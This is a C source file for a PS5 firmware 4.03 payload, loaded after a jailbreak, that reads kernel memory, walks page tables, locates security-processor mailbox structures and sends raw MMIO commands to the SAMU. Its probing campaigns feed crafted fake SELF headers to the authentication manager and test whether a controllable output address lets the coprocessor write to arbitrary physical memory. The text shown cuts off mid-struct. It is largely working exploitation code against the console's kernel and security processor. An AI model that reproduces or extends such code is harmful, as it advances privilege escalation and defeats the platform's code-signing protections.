/*
 * PS5 Hypervisor Research Tool - FW 4.03
 *
 * Standalone ELF payload for SBL mailbox probing and IOMMU/HV reconnaissance.
 * Load after jailbreaking with umtx2 + etaHEN via send_elf.py.
 *
 * Usage: python3 send_elf.py <ps5_ip> --name hv_research hv_research.elf
 *
 * This is a research/educational tool for personal console exploration.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>

#include <ps5/kernel.h>

/* ─── Notification helper ─── */

typedef struct {
    char useless1[45];
    char message[3075];
} notify_request_t;

int sceKernelSendNotificationRequest(int, notify_request_t*, size_t, int);

static void notify(const char *msg) {
    notify_request_t req;
    memset(&req, 0, sizeof(req));
    strncpy(req.message, msg, sizeof(req.message) - 1);
    sceKernelSendNotificationRequest(0, &req, sizeof(req), 0);
}

/* ─── Direct memory allocation (gives us physical addresses) ─── */

int sceKernelAllocateDirectMemory(off_t searchStart, off_t searchEnd,
                                  size_t len, size_t alignment,
                                  int memoryType, off_t *physAddrOut);
int sceKernelMapDirectMemory(void **addr, size_t len, int prot,
                             int flags, off_t directMemoryStart,
                             size_t alignment);

#define SCE_KERNEL_WC_GARLIC   3
#define SCE_KERNEL_WB_ONION    0

#define SCE_KERNEL_PROT_CPU_READ   0x01
#define SCE_KERNEL_PROT_CPU_WRITE  0x02
#define SCE_KERNEL_PROT_CPU_RW     0x03
#define SCE_KERNEL_PROT_GPU_READ   0x10
#define SCE_KERNEL_PROT_GPU_WRITE  0x20
#define SCE_KERNEL_PROT_GPU_RW     0x30

/* ─── Kernel struct offsets (common across FW versions) ─── */

#define OFFSET_PROC_P_VMSPACE    0x200
#define OFFSET_PMAP_PM_PML4      0x020

/* ─── SBL message structures ─── */

struct sbl_msg_header {
    uint32_t cmd;
    uint16_t query_len;
    uint16_t recv_len;
    uint64_t message_id;
    uint64_t to_ret;
}; /* 0x18 bytes */

/* AUTHMGR commands */
#define SBL_AUTHMGR_CMD 0x06

#define SBL_FUNC_VERIFY_HEADER       0x01
#define SBL_FUNC_LOAD_SELF_SEGMENT   0x02
#define SBL_FUNC_FINALIZE            0x05
#define SBL_FUNC_LOAD_SELF_BLOCK     0x06

/* SBL MMIO offsets from the SBL base physical address */
#define SBL_MMIO_PHYS_BASE    0xE0500000ULL
#define SBL_MMIO_CMD_REG      0x10564
#define SBL_MMIO_MBOX_PA_REG  0x10568
#define SBL_MMIO_STATUS_REG   0x10564

/* Mailbox slot sizing */
#define MAILBOX_SLOT_SIZE 0x800
#define MAILBOX_NUM       0x0E  /* We use slot 14 like etaHEN */

/* ─── Embedded kernel module (.ko) ─── */

__asm__ (
    ".section .rodata\n"
    ".global KMOD_KO\n"
    ".type KMOD_KO, @object\n"
    ".align 16\n"
    "KMOD_KO:\n"
    ".incbin \"kmod/hv_kmod.ko\"\n"
    "KMOD_KO_END:\n"
    ".global KMOD_KO_SZ\n"
    ".type KMOD_KO_SZ, @object\n"
    ".align 16\n"
    "KMOD_KO_SZ:\n"
    ".quad KMOD_KO_END - KMOD_KO\n"
);

extern const unsigned char KMOD_KO[];
extern const uint64_t KMOD_KO_SZ;

/* ─── Kmod shared data structures (must match kmod/hv_kmod.c) ─── */

#define KMOD_MAGIC          0xCAFEBABEDEAD1337ULL
#define KMOD_MAX_RESULTS    64
#define KMOD_STATUS_INIT    0
#define KMOD_STATUS_RUNNING 1
#define KMOD_STATUS_DONE    2

/* Sentinel values in .ko that get patched by userland before loading */
#define OUTPUT_KVA_SENTINEL 0xDEAD000000000000ULL
#define KDATA_BASE_SENTINEL 0xBEEF000000000001ULL
#define KTEXT_BASE_SENTINEL 0xBEEF000000000002ULL

#define KMOD_FLAG_VMMCALL_ENUM     (1 << 0)
#define KMOD_FLAG_VMMCALL_IOMMU    (1 << 1)
#define KMOD_FLAG_VMCB_PROBE       (1 << 2)
#define KMOD_FLAG_MSR_RECON        (1 << 3)
#define KMOD_FLAG_ALL              0xFFFFFFFF

struct vmmcall_result {
    uint64_t rax_in, rcx_in, rdx_in, rdi_in, rsi_in, r8_in;
    uint64_t rax_out, rcx_out, rdx_out, rdi_out, rsi_out, r8_out;
    uint32_t survived;
    uint32_t campaign_id;
};

struct kmod_result_buf {
    volatile uint64_t magic;
    volatile uint32_t status;
    volatile uint32_t current_campaign;
    volatile uint32_t current_probe;
    volatile uint32_t num_results;
    volatile uint32_t num_msr_results;
    volatile uint32_t pad;
    struct {
        uint32_t msr_id;
        uint32_t valid;
        uint64_t value;
    } msr_results[32];
    struct vmmcall_result results[KMOD_MAX_RESULTS];
};

/* kldsym lookup structure (matches FreeBSD sys/kld.h) */
struct kld_sym_lookup {
    int         version;    /* sizeof(struct kld_sym_lookup) */
    char       *symname;    /* Symbol name to look up */
    uint64_t    symvalue;   /* Returned: kernel VA of symbol */
    uint64_t    symsize;    /* Returned: size of symbol */
};

#define SYS_kldload     304
#define SYS_kldunload   305
#define SYS_kldfind     306
#define SYS_kldnext     307
#define SYS_kldstat     308   /* NOT 306 (that's kldfind) */
#define SYS_kldsym      337
#define KLDSYM_LOOKUP   1

/* kldstat file info structure (matches FreeBSD 11 sys/linker.h) */
struct kld_file_stat {
    int         version;        /* sizeof(struct kld_file_stat) */
    char        name[1024];     /* MAXPATHLEN */
    int         refs;
    int         id;
    uint64_t    address;        /* caddr_t - module base address in kernel */
    uint64_t    size;           /* module size in bytes */
    char        pathname[1024]; /* MAXPATHLEN - full path */
};

/* ─── Global state ─── */

static uint64_t g_dmap_base = 0;
static uint64_t g_kdata_base = 0;
static uint64_t g_ktext_base = 0;
static uint64_t g_fw_version = 0;
static uint64_t g_mmio_vaddr = 0;
static uint64_t g_cr3_phys = 0;   /* Kernel PML4 physical address */

/* Physical address of our message buffer */
static off_t    g_msg_phys = 0;
static void    *g_msg_vaddr = NULL;

/* SBL kernel data offsets for FW 4.03 */
static uint64_t g_mailbox_base_offset = 0;
static uint64_t g_mailbox_flags_offset = 0;
static uint64_t g_mailbox_meta_offset = 0;
static uint64_t g_message_id_offset = 0;

/* Message ID counter (local) */
static uint64_t g_local_msg_id = 0x414100;

/* ─── DMAP base discovery ─── */

/*
 * Discover DMAP base by reading the process pmap structure.
 * The pmap contains pm_pml4 (virtual) and pm_cr3 (physical).
 * On FreeBSD, the PML4 is mapped via DMAP, so:
 *   DMAP_BASE = pm_pml4 - pm_cr3
 */
static int discover_dmap_base(void) {
    uint64_t proc, vmspace, pmap_addr;
    uint64_t pm_pml4;
    uint64_t candidate_cr3;

    proc = kernel_get_proc(getpid());
    if (!proc) {
        printf("[-] Failed to get proc\n");
        return -1;
    }

    kernel_copyout(proc + OFFSET_PROC_P_VMSPACE, &vmspace, sizeof(vmspace));
    if (!vmspace) {
        printf("[-] Failed to get vmspace\n");
        return -1;
    }

    /* On PS5, vm_pmap is a pointer at offset 0x1D0 in vmspace */
    kernel_copyout(vmspace + 0x1D0, &pmap_addr, sizeof(pmap_addr));
    if (!pmap_addr) {
        printf("[-] Failed to get pmap\n");
        return -1;
    }

    /* Read pm_pml4 at pmap + 0x20 */
    kernel_copyout(pmap_addr + OFFSET_PMAP_PM_PML4, &pm_pml4, sizeof(pm_pml4));
    printf("[*] pm_pml4 = 0x%lx\n", pm_pml4);

    /* Try candidate offsets for pm_cr3 in the pmap structure */
    static const int cr3_offsets[] = {0x28, 0x30, 0x38, 0x40, 0x48};
    for (int i = 0; i < 5; i++) {
        kernel_copyout(pmap_addr + cr3_offsets[i], &candidate_cr3, sizeof(candidate_cr3));

        /* CR3 should be a reasonable physical address (< 32GB, non-zero, page-aligned) */
        if (candidate_cr3 == 0 || candidate_cr3 > 0x800000000ULL)
            continue;
        if (candidate_cr3 & 0xFFF)
            continue;

        uint64_t candidate_dmap = pm_pml4 - candidate_cr3;

        /* DMAP base should be in the high canonical half (0xFFFF8xxxxxxxxx) */
        if ((candidate_dmap >> 47) != 0 && candidate_dmap > 0xFFFF800000000000ULL) {
            /* Validate: read back pm_pml4 through DMAP and verify */
            uint64_t verify;
            if (kernel_copyout(candidate_dmap + candidate_cr3 + OFFSET_PMAP_PM_PML4,
                              &verify, sizeof(verify)) == 0) {
                /* This should give us a PML4 entry, not necessarily pm_pml4 itself */
                /* But if the read doesn't crash, the DMAP base is likely valid */
                g_dmap_base = candidate_dmap;
                g_cr3_phys = candidate_cr3;
                printf("[+] DMAP base discovered: 0x%lx (cr3_offset=0x%x, cr3=0x%lx)\n",
                       g_dmap_base, cr3_offsets[i], candidate_cr3);
                return 0;
            }
        }
    }

    /* Fallback: try common DMAP bases */
    printf("[!] Could not discover DMAP via pmap, trying common bases...\n");
    static const uint64_t common_dmap[] = {
        0xFFFFFF0000000000ULL,  /* DMPML4I=0x1FE, DMPDPI=0 */
        0xFFFFFE8000000000ULL,  /* DMPML4I=0x1FD, DMPDPI=0 */
        0xFFFF808000000000ULL,  /* DMPML4I=0x101, DMPDPI=2 */
        0xFFFF800000000000ULL,  /* DMPML4I=0x100, DMPDPI=0 */
    };

    for (int i = 0; i < 4; i++) {
        /* Try reading the SBL MMIO identification register */
        uint32_t test;
        if (kernel_copyout(common_dmap[i] + SBL_MMIO_PHYS_BASE, &test, sizeof(test)) == 0) {
            g_dmap_base = common_dmap[i];
            printf("[+] DMAP base found via fallback: 0x%lx\n", g_dmap_base);
            return 0;
        }
    }

    printf("[-] Failed to discover DMAP base\n");
    return -1;
}

/* ─── FW version detection and offset resolution ─── */

static int init_fw_offsets(void) {
    g_fw_version = kernel_get_fw_version() & 0xFFFF0000;
    g_kdata_base = KERNEL_ADDRESS_DATA_BASE;

    /* Derive kernel text base from data base.
     * The PS5 kernel loads .text before .data in the VA space.
     * The offset varies by FW version. We discover it by reading
     * a known kernel function pointer from allproc->p_list and
     * checking its range, or use known offsets. */
    switch (g_fw_version) {
    case 0x1000000: case 0x1010000: case 0x1020000:
    case 0x1050000: case 0x1100000: case 0x1110000:
    case 0x1120000: case 0x1130000: case 0x1140000:
        g_ktext_base = g_kdata_base - 0x1B40000;
        break;
    case 0x2000000: case 0x2200000: case 0x2250000:
    case 0x2260000: case 0x2300000: case 0x2500000:
    case 0x2700000:
        g_ktext_base = g_kdata_base - 0x1B80000;
        break;
    default:
        /* FW 3.xx-5.xx: Try to discover ktext from allproc.
         * Read first proc's p_list entry to find a kdata pointer,
         * then scan backwards for ktext by reading known ktext
         * pointer from the first proc's ucred->cr_sceauthid offset.
         * Fallback: estimate based on known FW 4.03 layout. */
        {
            /* FW 4.03 known: kdata=0xFFFFFFFFd4550000, ktext=0xFFFFFFFFd28d0000
             * Offset = 0x1C80000. Use page-aligned read to verify. */
            uint64_t try_offsets[] = { 0x1C80000, 0x1B80000, 0x2000000, 0x1E00000 };
            g_ktext_base = g_kdata_base - 0x1C80000;  /* default for FW 4.03 */

            for (int i = 0; i < 4; i++) {
                uint64_t candidate = g_kdata_base - try_offsets[i];
                /* Verify: read first 4 bytes — should be ELF magic or valid code */
                uint32_t test_val = 0;
                kernel_copyout(candidate, &test_val, sizeof(test_val));
                /* Common kernel .text starts: 0xCC (int3), 0x55 (push rbp),
                 * or page may start with various code patterns. Just check it's
                 * readable and non-zero. */
                if (test_val != 0 && test_val != 0xFFFFFFFF) {
                    g_ktext_base = candidate;
                    break;
                }
            }
        }
        break;
    }

    printf("[*] FW version: 0x%lx\n", g_fw_version);
    printf("[*] Kernel data base: 0x%lx\n", g_kdata_base);
    printf("[*] Kernel text base: 0x%lx\n", g_ktext_base);

    /*
     * SBL mailbox offsets (relative to kernel data base).
     * These must be discovered for FW 4.03.
     * The offsets below are placeholders that will be auto-discovered.
     */
    switch (g_fw_version) {
    case 0x4000000:
    case 0x4020000:
    case 0x4030000:
    case 0x4500000:
    case 0x4510000:
        printf("[+] FW 4.xx detected\n");
        break;
    default:
        printf("[!] Warning: FW 0x%lx may not be fully supported\n", g_fw_version);
        break;
    }

    return 0;
}

/* ─── SBL mailbox offset discovery ─── */

/*
 * Scan kernel data for the SBL mailbox base pointer.
 * The mailbox base points to a region that contains message slots,
 * each 0x800 bytes. We search for a pointer whose target looks
 * like a valid kernel address and has message-like data.
 */
static int discover_sbl_offsets(void) {
    printf("[*] Attempting SBL mailbox offset discovery...\n");

    /*
     * Strategy: The SBL driver stores several global variables in kernel .data:
     *   - sbl_mailbox_base (uint64_t pointer)
     *   - sbl_mailbox_to_bitmap (uint32_t flags)
     *   - sbl_mailbox_metadata (array of structs)
     *   - sbl_g_message_id (uint64_t counter)
     *
     * We scan kernel data for a 64-bit value that looks like a valid
     * kernel heap pointer. The mailbox region is allocated early in boot,
     * so it should be in the kernel heap range.
     *
     * For now, we'll scan a reasonable range of kernel .data for
     * patterns matching the SBL driver's data structures.
     */

    /* Heuristic ranges to scan (relative to data base) */
    /* Based on known offsets from other FW versions, the SBL data is
       typically between data_base + 0x2D00000 and data_base + 0x3000000 */
    uint64_t scan_start = 0x2C00000;
    uint64_t scan_end   = 0x3200000;
    uint64_t step       = 0x8;

    printf("[*] Scanning kernel data [0x%lx - 0x%lx] for SBL mailbox base...\n",
           g_kdata_base + scan_start, g_kdata_base + scan_end);

    for (uint64_t off = scan_start; off < scan_end; off += step) {
        uint64_t val;
        kernel_copyout(g_kdata_base + off, &val, sizeof(val));

        /* Mailbox base should be a valid kernel heap pointer */
        if ((val & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL)
            continue;
        if (val == 0 || val == 0xFFFFFFFFFFFFFFFFULL)
            continue;

        /* Read the first 8 bytes from the candidate mailbox region */
        uint64_t mbox_test;
        if (kernel_copyout(val, &mbox_test, sizeof(mbox_test)) != 0)
            continue;

        /* The mailbox region should be zeroed or contain small values */
        /* Try reading a message header from slot 0 */
        struct sbl_msg_header hdr;
        if (kernel_copyout(val + (0x800 * 0x10), &hdr, sizeof(hdr)) != 0)
            continue;

        /* Valid mailbox: cmd should be 0 or a small number (< 0x100) */
        if (hdr.cmd > 0x100)
            continue;

        /* Check if the flags bitmap is nearby (within 0x100 bytes) */
        for (uint64_t foff = off - 0x80; foff < off + 0x100; foff += 4) {
            uint32_t flags;
            kernel_copyout(g_kdata_base + foff, &flags, sizeof(flags));
            /* Flags bitmap should be 0 or have only low bits set (max 16 mailboxes) */
            if (flags <= 0xFFFF && foff != off) {
                g_mailbox_base_offset = off;
                g_mailbox_flags_offset = foff;
                printf("[+] Candidate mailbox base at data+0x%lx (ptr=0x%lx)\n", off, val);
                printf("[+] Candidate mailbox flags at data+0x%lx (val=0x%x)\n", foff, flags);

                /* Look for message ID counter nearby (uint64_t, value > 0) */
                for (uint64_t mid = off - 0x100; mid < off + 0x200; mid += 8) {
                    uint64_t msgid;
                    kernel_copyout(g_kdata_base + mid, &msgid, sizeof(msgid));
                    if (msgid > 0 && msgid < 0x10000000 && mid != off) {
                        g_message_id_offset = mid;
                        g_local_msg_id = msgid;
                        printf("[+] Candidate message ID at data+0x%lx (val=0x%lx)\n", mid, msgid);
                        break;
                    }
                }

                /* Look for metadata array nearby */
                for (uint64_t meta = off - 0x200; meta < off + 0x400; meta += 8) {
                    if (meta == off || meta == foff)
                        continue;
                    uint64_t metaval;
                    kernel_copyout(g_kdata_base + meta, &metaval, sizeof(metaval));
                    /* Metadata starts with a message_id (should match or be 0) */
                    if (metaval == 0 || (metaval > 0 && metaval < 0x10000000)) {
                        /* Check if this looks like the start of the metadata array */
                        uint64_t next_meta;
                        kernel_copyout(g_kdata_base + meta + 0x28, &next_meta, sizeof(next_meta));
                        if (next_meta == 0 || (next_meta > 0 && next_meta < 0x10000000)) {
                            g_mailbox_meta_offset = meta;
                            printf("[+] Candidate metadata at data+0x%lx\n", meta);
                            return 0;
                        }
                    }
                }

                /* Even without metadata, we can proceed with direct MMIO */
                return 0;
            }
        }
    }

    printf("[!] Could not auto-discover SBL offsets. Will use direct MMIO only.\n");
    return -1;
}

/* ─── Physical address resolution via page tables ─── */

/*
 * Walk AMD64 4-level page tables to resolve a virtual address to
 * its CPU physical address. Uses DMAP + CR3 to read page table entries.
 *
 * This is critical because sceKernelAllocateDirectMemory returns
 * PS5 direct memory bus addresses (e.g., 0x2000xxxxxxxx) which are
 * NOT CPU physical addresses. Only a page table walk gives the real
 * CPU PA that DMAP maps.
 *
 * Handles 4KB, 2MB (huge), and 1GB (giant) pages.
 */
#define PTE_PRESENT   (1ULL << 0)
#define PTE_PS        (1ULL << 7)   /* Page Size bit (huge/giant page) */
#define PTE_PA_MASK   0x000FFFFFFFFFF000ULL

static uint64_t va_to_cpu_pa(uint64_t va) {
    if (!g_cr3_phys || !g_dmap_base) {
        printf("[!] va_to_cpu_pa: no CR3 or DMAP base available\n");
        return 0;
    }

    uint64_t pml4_idx = (va >> 39) & 0x1FF;
    uint64_t pdpt_idx = (va >> 30) & 0x1FF;
    uint64_t pd_idx   = (va >> 21) & 0x1FF;
    uint64_t pt_idx   = (va >> 12) & 0x1FF;

    /* Level 4: PML4 */
    uint64_t pml4e;
    kernel_copyout(g_dmap_base + g_cr3_phys + pml4_idx * 8, &pml4e, 8);
    if (!(pml4e & PTE_PRESENT)) {
        printf("[!] PML4E[%lu] not present for VA 0x%lx\n", (unsigned long)pml4_idx, va);
        return 0;
    }

    /* Level 3: PDPT */
    uint64_t pdpte;
    kernel_copyout(g_dmap_base + (pml4e & PTE_PA_MASK) + pdpt_idx * 8, &pdpte, 8);
    if (!(pdpte & PTE_PRESENT)) {
        printf("[!] PDPTE[%lu] not present for VA 0x%lx\n", (unsigned long)pdpt_idx, va);
        return 0;
    }
    if (pdpte & PTE_PS) {
        /* 1GB giant page */
        return (pdpte & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);
    }

    /* Level 2: PD */
    uint64_t pde;
    kernel_copyout(g_dmap_base + (pdpte & PTE_PA_MASK) + pd_idx * 8, &pde, 8);
    if (!(pde & PTE_PRESENT)) {
        printf("[!] PDE[%lu] not present for VA 0x%lx\n", (unsigned long)pd_idx, va);
        return 0;
    }
    if (pde & PTE_PS) {
        /* 2MB huge page */
        return (pde & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);
    }

    /* Level 1: PT */
    uint64_t pte;
    kernel_copyout(g_dmap_base + (pde & PTE_PA_MASK) + pt_idx * 8, &pte, 8);
    if (!(pte & PTE_PRESENT)) {
        printf("[!] PTE[%lu] not present for VA 0x%lx\n", (unsigned long)pt_idx, va);
        return 0;
    }

    /* 4KB page */
    return (pte & PTE_PA_MASK) | (va & 0xFFF);
}

static uint64_t kva_to_pa(uint64_t va) {
    /* DMAP addresses: just subtract DMAP base */
    if (g_dmap_base && va >= g_dmap_base && va < g_dmap_base + 0x800000000ULL) {
        return va - g_dmap_base;
    }
    /* Otherwise, full page table walk */
    return va_to_cpu_pa(va);
}

/* Silent page table walk: returns PA or 0 if unmapped.  No printf. */
static uint64_t va_to_pa_quiet(uint64_t va) {
    if (!g_cr3_phys || !g_dmap_base) return 0;

    uint64_t e;
    kernel_copyout(g_dmap_base + g_cr3_phys + ((va >> 39) & 0x1FF) * 8, &e, 8);
    if (!(e & PTE_PRESENT)) return 0;

    kernel_copyout(g_dmap_base + (e & PTE_PA_MASK) + ((va >> 30) & 0x1FF) * 8, &e, 8);
    if (!(e & PTE_PRESENT)) return 0;
    if (e & PTE_PS) return (e & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);

    kernel_copyout(g_dmap_base + (e & PTE_PA_MASK) + ((va >> 21) & 0x1FF) * 8, &e, 8);
    if (!(e & PTE_PRESENT)) return 0;
    if (e & PTE_PS) return (e & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);

    kernel_copyout(g_dmap_base + (e & PTE_PA_MASK) + ((va >> 12) & 0x1FF) * 8, &e, 8);
    if (!(e & PTE_PRESENT)) return 0;
    return (e & PTE_PA_MASK) | (va & 0xFFF);
}

/* ─── Direct MMIO SBL communication ─── */

/*
 * Send a raw SBL message via MMIO.
 * This bypasses the kernel's SBL driver entirely.
 *
 * 1. Write message header + payload to our physical buffer
 * 2. Write the buffer's PA to MMIO_MBOX_PA_REG
 * 3. Write the command to MMIO_CMD_REG
 * 4. Poll for completion
 */
static int sbl_send_raw(uint32_t cmd, void *payload, uint16_t payload_len,
                        void *response, uint16_t response_len) {
    if (!g_mmio_vaddr || !g_msg_vaddr) {
        printf("[-] SBL not initialized\n");
        return -1;
    }

    /* Build message header */
    struct sbl_msg_header *hdr = (struct sbl_msg_header *)g_msg_vaddr;
    memset(g_msg_vaddr, 0, 0x800);

    hdr->cmd = cmd;
    hdr->query_len = payload_len;
    hdr->recv_len = response_len;
    hdr->message_id = g_local_msg_id++;
    hdr->to_ret = 0;

    /* Copy payload after header */
    if (payload && payload_len > 0) {
        memcpy((uint8_t *)g_msg_vaddr + sizeof(struct sbl_msg_header),
               payload, payload_len);
    }

    /* Clear response area (at offset 0x18 + 0x04 = res field) */
    int32_t sentinel = -69;
    memcpy((uint8_t *)g_msg_vaddr + 0x18 + 0x04, &sentinel, sizeof(sentinel));

    /*
     * If we have the kernel mailbox structures, use them.
     * Otherwise, we need to write our buffer to a kernel address
     * and use its PA for the MMIO trigger.
     *
     * Since sceKernelAllocateDirectMemory gives us the physical address,
     * and we mapped it for CPU access, we can:
     * 1. Write to g_msg_vaddr (CPU VA)
     * 2. Use g_msg_phys (PA) for the MMIO register
     *
     * BUT: The SBL MMIO expects the mailbox to be at a kernel-accessible
     * address. The SAMU reads from the physical address we provide.
     * Since our dmem allocation IS physically contiguous, this should work.
     */

    /* Write PA to MMIO mailbox PA register */
    uint32_t pa_low = (uint32_t)(g_msg_phys & 0xFFFFFFFF);
    uint32_t cmd_val = cmd << 8;

    kernel_copyin(&pa_low, g_mmio_vaddr + SBL_MMIO_MBOX_PA_REG, sizeof(pa_low));
    kernel_copyin(&cmd_val, g_mmio_vaddr + SBL_MMIO_CMD_REG, sizeof(cmd_val));

    /* Poll for completion (bit 0 of status register) */
    uint32_t status;
    int timeout = 500; /* 500ms max */
    do {
        usleep(1000);
        kernel_copyout(g_mmio_vaddr + SBL_MMIO_STATUS_REG, &status, sizeof(status));
        if (status & 1) {
            break;
        }
    } while (--timeout > 0);

    if (timeout <= 0) {
        printf("[-] SBL command 0x%x timed out (status=0x%08x)\n", cmd, status);
        return -1;
    }

    /* Extract return value from status */
    int ret = (int)((uint32_t)(status << 0x1E) >> 0x1F) & 0xfffffffb;

    /* Copy response if requested */
    if (response && response_len > 0) {
        /* Response is at offset 0x18 in the mailbox */
        memcpy(response, (uint8_t *)g_msg_vaddr + sizeof(struct sbl_msg_header), response_len);
    }

    printf("[*] SBL cmd=0x%x status=0x%08x ret=%d\n", cmd, status, ret);
    return ret;
}

/* ─── Initialization ─── */

static int init_sbl_direct(void) {
    /* Allocate a page of direct memory for our message buffer */
    int ret = sceKernelAllocateDirectMemory(
        0, 0x180000000ULL,
        0x4000, 0x4000,
        SCE_KERNEL_WB_ONION,
        &g_msg_phys
    );
    if (ret != 0) {
        printf("[-] sceKernelAllocateDirectMemory failed: 0x%x\n", ret);
        return -1;
    }

    ret = sceKernelMapDirectMemory(
        &g_msg_vaddr, 0x4000,
        SCE_KERNEL_PROT_CPU_RW,
        0, g_msg_phys, 0x4000
    );
    if (ret != 0) {
        printf("[-] sceKernelMapDirectMemory failed: 0x%x\n", ret);
        return -1;
    }

    printf("[+] Message buffer: VA=0x%lx PA=0x%lx\n",
           (uint64_t)g_msg_vaddr, (uint64_t)g_msg_phys);

    /* Compute MMIO virtual address via DMAP */
    g_mmio_vaddr = g_dmap_base + SBL_MMIO_PHYS_BASE;
    printf("[+] SBL MMIO VA: 0x%lx\n", g_mmio_vaddr);

    return 0;
}

/* ─── Research campaigns ─── */

/*
 * Campaign 1: SBL Command Enumeration
 * Send each possible command ID (0x00-0xFF) with minimal payload
 * and record which ones get a response vs. timeout vs. error.
 */
static void campaign_sbl_cmd_enum(void) {
    printf("\n========================================\n");
    printf("  Campaign 1: SBL Command Enumeration\n");
    printf("========================================\n\n");

    uint8_t payload[0x80];
    uint8_t response[0x80];

    for (uint32_t cmd = 0; cmd <= 0x20; cmd++) {
        memset(payload, 0, sizeof(payload));
        memset(response, 0, sizeof(response));

        /* Set function field to 0 (minimal) */
        payload[0] = 0;

        printf("[*] Testing SBL cmd=0x%02x ... ", cmd);
        fflush(stdout);

        int ret = sbl_send_raw(cmd, payload, 0x80, response, 0x80);

        /* Check the response's result field (at offset 0x04) */
        int32_t res;
        memcpy(&res, response + 0x04, sizeof(res));

        printf("ret=%d, res=%d\n", ret, res);

        /* Small delay between commands to avoid overwhelming SAMU */
        usleep(10000);
    }
}

/*
 * Campaign 2: AUTHMGR Function Enumeration
 * The AUTHMGR service (cmd=0x06) supports multiple functions.
 * Enumerate all possible function IDs.
 */
static void campaign_authmgr_func_enum(void) {
    printf("\n=============================================\n");
    printf("  Campaign 2: AUTHMGR Function Enumeration\n");
    printf("=============================================\n\n");

    uint8_t payload[0x80];
    uint8_t response[0x80];

    for (uint32_t func = 0; func <= 0x20; func++) {
        memset(payload, 0, sizeof(payload));
        memset(response, 0, sizeof(response));

        /* First DWORD is the function ID */
        memcpy(payload, &func, sizeof(func));

        printf("[*] AUTHMGR func=0x%02x ... ", func);
        fflush(stdout);

        int ret = sbl_send_raw(SBL_AUTHMGR_CMD, payload, 0x80, response, 0x80);

        int32_t res;
        memcpy(&res, response + 0x04, sizeof(res));

        printf("ret=%d, res=%d", ret, res);

        /* Dump first 16 bytes of response for analysis */
        printf(" [");
        for (int i = 0; i < 16; i++)
            printf("%02x", response[i]);
        printf("]\n");

        usleep(10000);
    }
}

/*
 * Campaign 3: VERIFY_HEADER probing
 * The VERIFY_HEADER function (0x01) takes a physical address to a SELF header.
 * We test with:
 * - PA = 0 (null)
 * - PA pointing to our controlled buffer (with crafted headers)
 * - PA pointing to known kernel locations
 */
static void campaign_verify_header_probe(void) {
    printf("\n=============================================\n");
    printf("  Campaign 3: VERIFY_HEADER PA Probing\n");
    printf("=============================================\n\n");

    struct {
        uint32_t function;        /* 0x00 = 0x01 (VERIFY_HEADER) */
        uint32_t res;             /* 0x04 */
        uint64_t self_header_pa;  /* 0x08 */
        uint32_t self_header_size;/* 0x10 */
        uint8_t  unk14[0x8];     /* 0x14 */
        uint32_t service_id;      /* 0x1C */
        uint64_t auth_id;         /* 0x20 */
        uint8_t  pad[0x80 - 0x28];
    } __attribute__((packed)) verify_hdr;

    uint8_t response[0x80];

    /* Test 1: Null PA */
    printf("[*] VERIFY_HEADER with PA=0 (null test)\n");
    memset(&verify_hdr, 0, sizeof(verify_hdr));
    verify_hdr.function = SBL_FUNC_VERIFY_HEADER;
    verify_hdr.self_header_pa = 0;
    verify_hdr.self_header_size = 0x100;
    verify_hdr.auth_id = 0x4800000000000007ULL; /* ShellCore auth ID */

    memset(response, 0, sizeof(response));
    sbl_send_raw(SBL_AUTHMGR_CMD, &verify_hdr, 0x80, response, 0x80);

    int32_t res;
    memcpy(&res, response + 0x04, sizeof(res));
    printf("    res=%d\n", res);

    /* Test 2: PA pointing to our buffer with Prospero SELF magic */
    printf("[*] VERIFY_HEADER with controlled buffer (Prospero SELF magic)\n");

    /* Write a fake SELF header to our second page */
    uint8_t *fake_self = (uint8_t *)g_msg_vaddr + 0x1000;
    memset(fake_self, 0, 0x1000);

    /* Prospero SELF magic */
    uint32_t magic = 0xEEF51454;
    memcpy(fake_self, &magic, 4);
    fake_self[4] = 0x00; /* version */
    fake_self[5] = 0x01; /* mode */
    fake_self[6] = 0x01; /* endian (little) */
    fake_self[7] = 0x00; /* attributes */

    memset(&verify_hdr, 0, sizeof(verify_hdr));
    verify_hdr.function = SBL_FUNC_VERIFY_HEADER;
    verify_hdr.self_header_pa = (uint64_t)(g_msg_phys + 0x1000);
    verify_hdr.self_header_size = 0x200;
    verify_hdr.auth_id = 0x4800000000000007ULL;

    memset(response, 0, sizeof(response));
    sbl_send_raw(SBL_AUTHMGR_CMD, &verify_hdr, 0x80, response, 0x80);

    memcpy(&res, response + 0x04, sizeof(res));
    printf("    res=%d\n", res);

    /* Dump full response */
    printf("    Response: ");
    for (int i = 0; i < 32; i++)
        printf("%02x", response[i]);
    printf("\n");

    /* Test 3: PA pointing to our buffer with Orbis SELF magic */
    printf("[*] VERIFY_HEADER with controlled buffer (Orbis SELF magic)\n");

    magic = 0x1D3D154F;
    memcpy(fake_self, &magic, 4);

    memset(&verify_hdr, 0, sizeof(verify_hdr));
    verify_hdr.function = SBL_FUNC_VERIFY_HEADER;
    verify_hdr.self_header_pa = (uint64_t)(g_msg_phys + 0x1000);
    verify_hdr.self_header_size = 0x200;
    verify_hdr.auth_id = 0x4800000000000007ULL;

    memset(response, 0, sizeof(response));
    sbl_send_raw(SBL_AUTHMGR_CMD, &verify_hdr, 0x80, response, 0x80);

    memcpy(&res, response + 0x04, sizeof(res));
    printf("    res=%d\n", res);

    printf("    Response: ");
    for (int i = 0; i < 32; i++)
        printf("%02x", response[i]);
    printf("\n");
}

/*
 * Campaign 4: LOAD_SELF_BLOCK out_pa probing
 * The LOAD_SELF_BLOCK function (0x06) has an out_pa field.
 * If SAMU writes decrypted data to this PA, and we control it,
 * we may be able to get SAMU to write to arbitrary physical addresses.
 */
static void campaign_load_block_outpa(void) {
    printf("\n=============================================\n");
    printf("  Campaign 4: LOAD_SELF_BLOCK out_pa Probe\n");
    printf("=============================================\n\n");

    struct {
        uint32_t function;        /* 0x00 = 0x06 */
        uint32_t res;             /* 0x04 */
        uint64_t out_pa;          /* 0x08 */
        uint64_t in_pa;           /* 0x10 */
        uint64_t unk18;           /* 0x18 */
        uint64_t unk20;           /* 0x20 */
        uint64_t unk28;           /* 0x28 */
        uint32_t aligned_size;    /* 0x30 */
        uint32_t size;            /* 0x34 */
